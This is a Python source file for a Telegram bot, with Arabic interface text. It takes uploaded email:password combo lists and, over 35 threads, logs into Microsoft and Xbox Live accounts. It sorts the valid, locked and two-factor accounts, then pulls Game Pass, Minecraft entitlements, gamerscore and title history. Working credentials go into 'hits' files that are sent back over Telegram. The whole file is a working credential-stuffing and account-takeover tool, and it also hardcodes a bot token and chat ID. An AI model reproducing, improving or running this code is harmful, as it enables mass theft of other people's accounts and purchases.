import os
import sys
import time
import requests
import re
import threading
from urllib.parse import urlparse, parse_qs
import urllib3
import concurrent.futures
from requests.adapters import HTTPAdapter
from datetime import datetime
from flask import Flask
import telebot

urllib3.disable_warnings()

# ============================================
# 🌐 1. إعداد سيرفر الـ Flask الوهمي (لبقاء البوت شغّالاً 24/7 على Render)
# ============================================
app = Flask('')

@app.route('/')
def home():
    return "XBOX Telegram Checker Bot is active and running 24/7!"

def run_flask():
    port = int(os.environ.get("PORT", 10000))
    app.run(host='0.0.0.0', port=port)

def keep_alive():
    t = threading.Thread(target=run_flask)
    t.daemon = True
    t.start()

# ============================================
# ✅ التوكن والايدي الخاص بك
# ============================================
BOT_TOKEN = "6630800841:AAERR7Rw0X_lNo3JnAr5lkoN1nkKZXCe7hw"  
CHAT_ID = "705071845"    

bot = telebot.TeleBot(BOT_TOKEN)

REQUEST_TIMEOUT = 20
DELAY_BETWEEN_CHECKS = 2

file_lock = threading.Lock()
stats_lock = threading.Lock()

def format_file_size(size_bytes):
    if size_bytes < 1024:
        return f"{size_bytes} B"
    elif size_bytes < 1024 * 1024:
        return f"{size_bytes / 1024:.1f} KB"
    else:
        return f"{size_bytes / (1024 * 1024):.1f} MB"

def save_formatted_account(session_folder, filename, account_data, counter):
    filepath = os.path.join(session_folder, filename)
    with file_lock:
        with open(filepath, 'a', encoding='utf-8') as f:
            f.write("_________________________________________________________\n")
            f.write(f"Account number: {counter}\n")
            f.write(f"Email: {account_data['email']}\n")
            f.write(f"Password: {account_data['password']}\n")
            f.write(f"Gamerscore: {account_data['gamerscore']}G\n")
            f.write(f"GamePass: {account_data['gamepass']}\n")
            f.write(f"Minecraft: {account_data['minecraft']}\n")
            f.write(f"Purchases: {account_data['purchases_count']} items\n")
            if account_data['purchases_list']:
                for item in account_data['purchases_list']:
                    f.write(f"  - {item}\n")
            f.write(f"Tool by @zx_dx2\n")
            f.write("_________________________________________________________\n\n")

def check_single_account(combo, session_folder, stats, counters):
    parts = combo.split(':')
    if len(parts) < 2:
        with stats_lock:
            stats['bad'] += 1
            stats['checked'] += 1
        return

    email = parts[0].strip()
    password = ':'.join(parts[1:]).strip()
    adapter = HTTPAdapter(pool_connections=50, pool_maxsize=50)

    for attempt in range(3):
        session = requests.Session()
        session.verify = False
        session.mount('https://', adapter)
        session.mount('http://', adapter)
        session.headers.update({
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
        })

        try:
            sftag_url = "https://login.live.com/oauth20_authorize.srf?client_id=00000000402B5328&redirect_uri=https://login.live.com/oauth20_desktop.srf&scope=service::user.auth.xboxlive.com::MBI_SSL&display=touch&response_type=token&locale=en"
            resp = session.get(sftag_url, timeout=REQUEST_TIMEOUT)
            text = resp.text

            sftag_match = re.search(r'value=\\\"(.+?)\\\"', text) or re.search(r'value="(.+?)"', text)
            url_match = re.search(r'"urlPost":"(.+?)"', text) or re.search(r"urlPost:'(.+?)'", text)

            if not sftag_match or not url_match:
                with stats_lock:
                    stats['bad'] += 1
                    stats['checked'] += 1
                return

            sftag = sftag_match.group(1)
            url_post = url_match.group(1)

            login_data = {'login': email, 'loginfmt': email, 'passwd': password, 'PPFT': sftag}
            headers = {'Content-Type': 'application/x-www-form-urlencoded'}
            login_req = session.post(url_post, data=login_data, headers=headers, allow_redirects=True, timeout=REQUEST_TIMEOUT)

            ms_token = None
            login_text = login_req.text.lower()

            if 'access_token' in login_req.url:
                ms_token = parse_qs(urlparse(login_req.url).fragment).get('access_token', [None])[0]
            elif any(x in login_text for x in ["password is incorrect", "account doesn't exist", "passwords don't match"]):
                with stats_lock:
                    stats['bad'] += 1
                    stats['checked'] += 1
                return
            elif any(x in login_text for x in ["recover", "account.live.com/identity/confirm", "email/confirm", "abuse", "locked", "help us protect"]):
                with stats_lock:
                    stats['twofa'] += 1
                    stats['checked'] += 1
                return
            elif 'cancel?mkt=' in login_text:
                try:
                    ipt_match = re.search(r'"ipt" value="(.+?)"', login_req.text)
                    pprid_match = re.search(r'"pprid" value="(.+?)"', login_req.text)
                    uaid_match = re.search(r'"uaid" value="(.+?)"', login_req.text)
                    action_match = re.search(r'id="fmHF" action="(.+?)"', login_req.text)

                    if ipt_match and pprid_match and uaid_match and action_match:
                        data2 = {'ipt': ipt_match.group(1), 'pprid': pprid_match.group(1), 'uaid': uaid_match.group(1)}
                        ret = session.post(action_match.group(1), data=data2, allow_redirects=True, timeout=REQUEST_TIMEOUT)
                        return_url = re.search(r'"returnUrl":"(.+?)"', ret.text)
                        if return_url:
                            fin = session.get(return_url.group(1), allow_redirects=True, timeout=REQUEST_TIMEOUT)
                            ms_token = parse_qs(urlparse(fin.url).fragment).get('access_token', [None])[0]
                except:
                    pass

            if not ms_token:
                with stats_lock:
                    stats['bad'] += 1
                    stats['checked'] += 1
                return

            xb_payload = {"Properties": {"AuthMethod": "RPS", "SiteName": "user.auth.xboxlive.com", "RpsTicket": ms_token}, "RelyingParty": "http://auth.xboxlive.com", "TokenType": "JWT"}
            xb_headers = {'Content-Type': 'application/json', 'Accept': 'application/json'}
            xb_req = session.post('https://user.auth.xboxlive.com/user/authenticate', json=xb_payload, headers=xb_headers, timeout=REQUEST_TIMEOUT)

            if xb_req.status_code != 200:
                raise Exception("Xbox Auth Error")

            xb_token = xb_req.json()['Token']
            uhs = xb_req.json()['DisplayClaims']['xui'][0]['uhs']

            gamerscore = "0"
            gscore_int = 0
            xuid = None
            xsts_xb_token = None

            try:
                xsts_xb_payload = {"Properties": {"SandboxId": "RETAIL", "UserTokens": [xb_token]}, "RelyingParty": "http://xboxlive.com", "TokenType": "JWT"}
                xsts_xb_req = session.post('https://xsts.auth.xboxlive.com/xsts/authorize', json=xsts_xb_payload, headers=xb_headers, timeout=REQUEST_TIMEOUT)
                if xsts_xb_req.status_code == 200:
                    xsts_xb_token = xsts_xb_req.json()['Token']
                    prof_req = session.get("https://profile.xboxlive.com/users/me/profile/settings?settings=Gamertag,Gamerscore",
                                           headers={"Authorization": f"XBL3.0 x={uhs};{xsts_xb_token}", "x-xbl-contract-version": "2"}, timeout=REQUEST_TIMEOUT)
                    if prof_req.status_code == 200:
                        data = prof_req.json()
                        settings = data.get('profileUsers', [{}])[0].get('settings', [])
                        for s in settings:
                            if s['id'] == 'Gamerscore':
                                gamerscore = s['value']
                                try:
                                    gscore_int = int(gamerscore)
                                except:
                                    gscore_int = 0
                        xuid = data.get('profileUsers', [{}])[0].get('id')
            except:
                pass

            has_gp = False
            has_mc = False
            gp_type = "none"
            mc_ent_text = ""

            try:
                xsts_mc_payload = {"Properties": {"SandboxId": "RETAIL", "UserTokens": [xb_token]}, "RelyingParty": "rp://api.minecraftservices.com/", "TokenType": "JWT"}
                xsts_mc_req = session.post('https://xsts.auth.xboxlive.com/xsts/authorize', json=xsts_mc_payload, headers=xb_headers, timeout=REQUEST_TIMEOUT)
                if xsts_mc_req.status_code == 200:
                    xsts_mc_token = xsts_mc_req.json()['Token']
                    mc_auth = session.post('https://api.minecraftservices.com/authentication/login_with_xbox',
                                           json={'identityToken': f"XBL3.0 x={uhs};{xsts_mc_token}"},
                                           headers={'Content-Type': 'application/json'}, timeout=REQUEST_TIMEOUT)
                    if mc_auth.status_code == 200:
                        mc_token = mc_auth.json().get('access_token')
                        if mc_token:
                            ent_req = session.get('https://api.minecraftservices.com/entitlements/mcstore',
                                                  headers={'Authorization': f'Bearer {mc_token}'}, timeout=REQUEST_TIMEOUT)
                            if ent_req.status_code == 200:
                                mc_ent_text = ent_req.text
            except:
                pass

            if 'product_game_pass_ultimate' in mc_ent_text:
                gp_type = "Game Pass Ultimate"
                has_gp = True
            elif 'product_game_pass_pc' in mc_ent_text:
                gp_type = "PC Game Pass"
                has_gp = True
            elif 'product_game_pass_console' in mc_ent_text:
                gp_type = "Xbox Game Pass Console"
                has_gp = True

            if not has_gp and 'product_minecraft' in mc_ent_text:
                has_mc = True

            has_gscore = False
            if not has_gp and gscore_int > 0:
                has_gscore = True

            purchases_list = []
            purchases_count = 0
            if xuid and xsts_xb_token:
                try:
                    ach_url = f"https://achievements.xboxlive.com/users/xuid({xuid})/history/titles?maxItems=999"
                    ach_resp = session.get(
                        ach_url,
                        headers={
                            "Authorization": f"XBL3.0 x={uhs};{xsts_xb_token}",
                            "x-xbl-contract-version": "2"
                        },
                        timeout=REQUEST_TIMEOUT
                    )
                    if ach_resp.status_code == 200:
                        titles = ach_resp.json().get('titles', [])
                        for t in titles:
                            name = t.get('name', 'Unknown')
                            score = t.get('currentGamerscore', 0)
                            purchases_list.append(f"{name} | {score}G")
                        purchases_count = len(purchases_list)
                except:
                    pass

            account_data = {
                'email': email,
                'password': password,
                'gamerscore': gamerscore,
                'gamepass': gp_type,
                'minecraft': 'Yes' if has_mc else 'No',
                'purchases_count': purchases_count,
                'purchases_list': purchases_list
            }

            with file_lock:
                counters['account_counter'] += 1
                curr_counter = counters['account_counter']

            save_formatted_account(session_folder, "XBOX-Valid.txt", account_data, curr_counter)
            if has_gp:
                save_formatted_account(session_folder, "XBOX-GamePass.txt", account_data, curr_counter)
            if has_mc:
                save_formatted_account(session_folder, "Minecraft-Hits.txt", account_data, curr_counter)
            if has_gscore:
                save_formatted_account(session_folder, "G-Score-Hits.txt", account_data, curr_counter)

            with stats_lock:
                if has_gp or has_mc or has_gscore:
                    stats['hits'] += 1
                    if has_gp:
                        stats['gamepass_count'] += 1
                    if has_mc:
                        stats['minecraft_count'] += 1
                    if has_gscore:
                        stats['gscore_count'] += 1
                else:
                    stats['bad'] += 1
                stats['checked'] += 1

            time.sleep(DELAY_BETWEEN_CHECKS)
            return

        except requests.exceptions.RequestException:
            time.sleep(1)
        except Exception:
            time.sleep(0.5)
        finally:
            if session:
                session.close()

    with stats_lock:
        stats['errors'] += 1
        stats['checked'] += 1

@bot.message_handler(commands=['start'])
def send_welcome(message):
    bot.reply_to(message, "مرحباً بك! أرسل لي ملف لستة الحسابات (.txt) وسأبدأ فحص حسابات XBOX وإرسال النتائج إليك فوراً. 🚀")

@bot.message_handler(content_types=['document'])
def handle_docs(message):
    if str(message.chat.id) != str(CHAT_ID):
        bot.reply_to(message, "عذراً، هذا البوت مخصص لشخص واحد فقط.")
        return

    file_info = bot.get_file(message.document.file_id)
    downloaded_file = bot.download_file(file_info.file_path)

    local_filename = message.document.file_name or "combos.txt"
    with open(local_filename, 'wb') as f:
        f.write(downloaded_file)

    bot.reply_to(message, f"📥 تم استقبال الملف: <b>{local_filename}</b>\n⏳ جاري بدء الفحص الآن...", parse_mode='HTML')

    # تشغيل الفحص في خلفية مستقلة لكي لا يتوقف البوت
    threading.Thread(target=process_combo_file, args=(message.chat.id, local_filename)).start()

def process_combo_file(chat_id, filename):
    try:
        with open(filename, 'r', encoding='utf-8', errors='ignore') as f:
            combos = [line.strip() for line in f if ':' in line.strip()]
    except Exception as e:
        bot.send_message(chat_id, f"❌ حدث خطأ أثناء قراءة الملف: {e}")
        return

    total_combos = len(combos)
    if total_combos == 0:
        bot.send_message(chat_id, "⚠️ الملف فارغ أو لا يحتوي على صيغة (إيميل:باسورد صحيحة).")
        return

    timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    session_folder = os.path.join("XBOX_RESULT", f"Session_{timestamp}")
    os.makedirs(session_folder, exist_ok=True)

    stats = {
        'checked': 0,
        'hits': 0,
        'bad': 0,
        'twofa': 0,
        'errors': 0,
        'gamepass_count': 0,
        'minecraft_count': 0,
        'gscore_count': 0
    }
    counters = {'account_counter': 0}
    start_time = time.time()

    threads = min(35, total_combos)

    with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
        for combo in combos:
            executor.submit(check_single_account, combo, session_folder, stats, counters)

    elapsed_time = int(time.time() - start_time)

    # إرسال الملفات الناتجة إن وجدت
    session_files = ["XBOX-Valid.txt", "XBOX-GamePass.txt", "Minecraft-Hits.txt", "G-Score-Hits.txt"]
    for sf in session_files:
        sf_path = os.path.join(session_folder, sf)
        if os.path.exists(sf_path) and os.path.getsize(sf_path) > 0:
            try:
                with open(sf_path, 'rb') as doc:
                    bot.send_document(chat_id, doc, caption=f"📁 ملف النتائج: {sf}")
            except:
                pass

    # إرسال ملخص الفحص
    summary = f"""<b>📊 ملخص فحص XBOX التفاعلي</b>

✅ <b>تم الفحص:</b> {stats['checked']} / {total_combos}
🎯 <b>Hits:</b> {stats['hits']}
❌ <b>Bad:</b> {stats['bad']}
🔐 <b>2FA:</b> {stats['twofa']}
⚠️ <b>Errors:</b> {stats['errors']}

🏆 <b>Game Pass:</b> {stats['gamepass_count']}
⛏️ <b>Minecraft:</b> {stats['minecraft_count']}
⭐ <b>G-Score:</b> {stats['gscore_count']}

⏱️ <b>المدة:</b> {elapsed_time} ثانية
    """
    bot.send_message(chat_id, summary, parse_mode='HTML')

if __name__ == "__main__":
    # تشغيل سيرفر الـ Flask الوهمي للبقاء حياً على Render
    keep_alive()
    
    # تشغيل بوت التليجرام ليستقبل الملفات والرسائل
    print("Telegram Bot & Flask Server are running...")
    bot.infinity_polling(skip_pending=True)
